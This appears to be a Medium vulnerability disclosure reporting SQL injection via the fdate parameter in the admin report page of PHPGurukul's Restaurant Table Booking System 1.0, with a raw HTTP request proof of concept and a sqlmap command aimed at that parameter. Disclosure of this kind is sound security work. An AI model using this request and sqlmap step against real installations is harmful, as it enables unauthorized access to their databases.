=== Content from medium.com_95624ac1_20250114_205842.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F30708cfabe03&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Frestaurant-table-booking-system-sql-injection-vulnerability-30708cfabe03&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Frestaurant-table-booking-system-sql-injection-vulnerability-30708cfabe03&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Restaurant Table Booking System SQL injection vulnerability

[![heishou](https://miro.medium.com/v2/resize:fill:88:88/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---byline--30708cfabe03--------------------------------)

[heishou](/%40heishou?source=post_page---byline--30708cfabe03--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffc1fddf341cd&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40heishou%2Frestaurant-table-booking-system-sql-injection-vulnerability-30708cfabe03&user=heishou&userId=fc1fddf341cd&source=post_page-fc1fddf341cd--byline--30708cfabe03---------------------post_header-----------)

2 min read·Dec 22, 2023

--

Listen

Share

Vulnerability submitted by:
 heishou
 Affected Version: 1.0
 Manufacturer:
 <https://phpgurukul.com>
 Vulnerability Description:
 Restaurant table reservation system V1.0 is vulnerable to SQL injection via fdate parameter in/rtbs/admin/bwdates-report-details.php
 Source code download:
<https://phpgurukul.com/restaurant-table-booking-system-using-php-and-mysql>

## code analysis

Unvalidated or filtered user input $fdate was used when constructing SQL query statements. An attacker could inject malicious SQL code into the search field to perform unauthorized database operations.

![]()
## POC

```
POST /Restaurant-Table-Booking-System-PHP/rtbs/admin/bwdates-report-details.php HTTP/1.1
Host: localhost
Content-Length: 41
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Restaurant-Table-Booking-System-PHP/rtbs/admin/bw-dates-report.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: USER_NAME_COOKIE=admin; SID_1=aa141d36; mailpoet_page_view=%7B%22timestamp%22%3A1694409700%7D; mailpoet_subscriber=%7B%22subscriber_id%22%3A2%7D; PHPSESSID=s0bvvd381g2h7nkjbr1sllm2j8
Connection: close

fdate=2023-12-21&tdate=2023-12-01&submit=
```

Sqlmap:

![]()

python sqlmap.py -r “C:\Python27\1.txt” -p fdate -level 1 -risk 1

--

--

[![heishou](https://miro.medium.com/v2/resize:fill:96:96/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--30708cfabe03--------------------------------)[![heishou](https://miro.medium.com/v2/resize:fill:128:128/1*pR2bjEaLc11S00QyPXDWFA.png)](/%40heishou?source=post_page---post_author_info--30708cfabe03--------------------------------)Follow[## Written by heishou](/%40heishou?source=post_page---post_author_info--30708cfabe03--------------------------------)[1 Follower](/%40heishou/followers?source=post_page---post_author_info--30708cfabe03--------------------------------)·[3 Following](/%40heishou/following?source=post_page---post_author_info--30708cfabe03--------------------------------)

Pretending to make you fly

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----30708cfabe03--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----30708cfabe03--------------------------------)[About](/about?autoplay=1&source=post_page-----30708cfabe03--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----30708cfabe03--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----30708cfabe03--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----30708cfabe03--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----30708cfabe03--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----30708cfabe03--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----30708cfabe03--------------------------------)[Teams](/business?source=post_page-----30708cfabe03--------------------------------)


